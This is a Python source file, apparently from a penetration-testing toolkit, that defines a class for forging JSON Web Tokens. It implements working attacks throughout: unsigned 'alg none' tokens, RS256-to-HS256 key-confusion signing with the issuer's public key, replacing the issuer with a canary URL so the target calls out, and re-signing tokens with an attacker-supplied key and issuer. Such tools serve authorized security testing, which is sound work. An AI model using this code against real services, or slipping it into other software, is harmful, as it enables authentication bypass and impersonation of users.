import requests
import json
import base64
import sys
import jwt
from jwt import PyJWKClient
from jwt.algorithms import RSAAlgorithm
from cryptography.hazmat.primitives import serialization
import hashlib
import hmac
import random
import string
import datetime
from waabi.utility.reader import Reader

class Jwty(object):
    
    @staticmethod
    def Uenc(part):
        part = json.dumps(part) if part else '{}'
        return base64.urlsafe_b64encode(part.encode()).strip(b'=')
    @staticmethod
    def SignAsHS(header,payload,secret,alg):
        eh = Jwty.Uenc(header)
        ep = Jwty.Uenc(payload)
        sig = base64.urlsafe_b64encode(hmac.new(secret, eh + b'.' + ep, alg).digest().strip()).strip(b'=')   
        return "{0}.{1}.{2}".format(
            eh.decode(),
            ep.decode(),
            sig.decode()
        )

    def __init__(self,t):
        parts = t.split(".")
        self.header = jwt.get_unverified_header(t)
        self.payload = jwt.decode(t,options={"verify_signature":False})
        self.signature = parts[2] if len(parts) > 2 else None
        self.encoded = t
        self.errors = []
        self.public_key = self._get_public_key()

    def _get_public_key(self):
        if self.header["alg"][:2] == "RS":
            try:
                wk_res = requests.get(self.payload["iss"] + "/.well-known/openid-configuration")
                jwks_uri = wk_res.json()["jwks_uri"]
                jwks_client = PyJWKClient(jwks_uri)
                return jwks_client.get_signing_key_from_jwt(self.encoded).key.public_bytes(
                    encoding=serialization.Encoding.PEM,
                    format=serialization.PublicFormat.SubjectPublicKeyInfo
                )
            except Exception as ex:
                self.errors.append("Error getting public Key: {0}".format(str(ex)))
        return None
    
       
    def AsAlgNone(self):
        header = {
            "alg": "none",
            "typ": "JWT"
        }
        eh = Jwty.Uenc(header)
        ep = Jwty.Uenc(self.payload)
        return "{0}.{1}.".format(eh.decode(),ep.decode())


    def AsAlgHS256(self):
        if self.public_key:
            header = {
                "alg": "HS256",
                "typ": "JWT"
            }

            return Jwty.SignAsHS(header,self.payload,self.public_key,hashlib.sha256)
           

        msg = "No RSA Public Key Found!\n"
        if len(self.errors) > 0:
            msg += "\n".join(self.errors)
        return msg
    
    def WithCanaryIss(self,canary): 
        header = self.header
        payload = self.payload
        
        header["kid"] = "".join(random.choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for _ in range(43))
        header["alg"] = "RS256"
        payload["iss"] = "{0}oauth2/lidukgiq45hkkpxfucuq5b1qo".format(canary)
        eh = Jwty.Uenc(header)
        ep = Jwty.Uenc(payload)
        return "{0}.{1}.{2}".format(
            eh.decode(),
            ep.decode(),
            self.signature
        )

    def WithMockOauth(self,issuer,private_key_file,kid):
        iat = int(datetime.datetime.now().timestamp())
        headers = {
            "kid": kid
        }
        payload = self.payload
        payload["iss"] = issuer
        payload["iat"] = iat
        payload["exp"] = iat + 3600
        
        try:
            token = jwt.encode(
                payload,
                Reader.Read(private_key_file),
                algorithm="RS256",
                headers=headers
            )
            return token
        except Exception as ex:
            return "Error encoding token: {0}".format(ex)
    
    def PublicKey(self): 
        if self.public_key: 
            return self.public_key.decode()
        else: 
            return "Error: Public Key not found"


    @staticmethod    
    def Construct(payload, keyfile, kid, issuer, header, secret, signature):
        alg = header["alg"] if header and "alg" in header.keys() else False


        if secret:
            if not alg:
                return "Error: Header containing an alg must be present when supplying secret."
            else: 
                try:
                    if alg in ("HS256","HS512"): 
                        alg_enc = hashlib.sha512 if alg == "HS512" else hashlib.sha256
                        return Jwty.SignAsHS(header,payload,secret.encode(),alg_enc)
                    header.pop("alg",None)
                    token = jwt.encode(
                        payload,
                        secret,
                        algorithm=alg,
                        headers=header

                    )
                    return token
                except Exception as ex: 
                    return "Error encoding token: {0}".format(ex)

        if signature: 
            eh = Jwty.Uenc(header)
            ep = Jwty.Uenc(payload)
            return "{0}.{1}.{2}".format(eh.decode(),ep.decode(),signature)


        header = header if header else {}
        header["alg"] = "RS256"
        header["kid"] = kid
        payload["iss"] = issuer
        try: 
            token = jwt.encode(
                payload,
                Reader.Read(keyfile),
                algorithm="RS256",
                headers=header
            )
            return token
        except Exception as ex: 
            return "Error encoding token: {0}".format(ex)

